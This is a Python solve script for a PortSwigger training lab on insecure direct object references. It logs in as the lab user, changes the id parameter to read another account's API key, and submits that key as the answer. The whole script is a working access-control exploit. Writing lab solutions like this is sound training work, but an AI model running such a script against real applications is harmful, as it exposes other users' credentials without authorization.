#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
User ID controlled by request parameter.

Logs in as wiener, fetches /my-account?id=carlos to read carlos's API key,
then submits it as the lab solution.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> None:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    if "Invalid username or password" in r.text:
        raise SystemExit("[-] Login failed")
    print(f"[*] Logged in as {username}")


def get_api_key(session: requests.Session, lab: str, target: str) -> str:
    r = session.get(f"{lab}/my-account", params={"id": target})
    m = re.search(r"Your API Key is:\s*<[^>]+>([^<]+)<", r.text)
    if not m:
        m = re.search(r"API Key[^:]*:\s*([A-Za-z0-9]+)", r.text)
    if not m:
        raise SystemExit(f"[-] Could not find API key for '{target}'")
    return m.group(1).strip()


def submit_solution(session: requests.Session, lab: str, answer: str) -> None:
    csrf = get_csrf(session, lab)
    r = session.post(f"{lab}/submitSolution", data={"answer": answer, "csrf": csrf})
    if "Congratulations" in r.text or r.ok:
        print("[+] Solution submitted. Lab solved.")
    else:
        print(f"[-] Submission status {r.status_code} — check manually")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Access Control Lab 5 (IDOR via id parameter)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    parser.add_argument("--target", default="carlos")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    login(s, lab, args.username, args.password)

    print(f"[*] Fetching /my-account?id={args.target}")
    api_key = get_api_key(s, lab, args.target)
    print(f"[+] API key: {api_key}")

    submit_solution(s, lab, api_key)


if __name__ == "__main__":
    main()
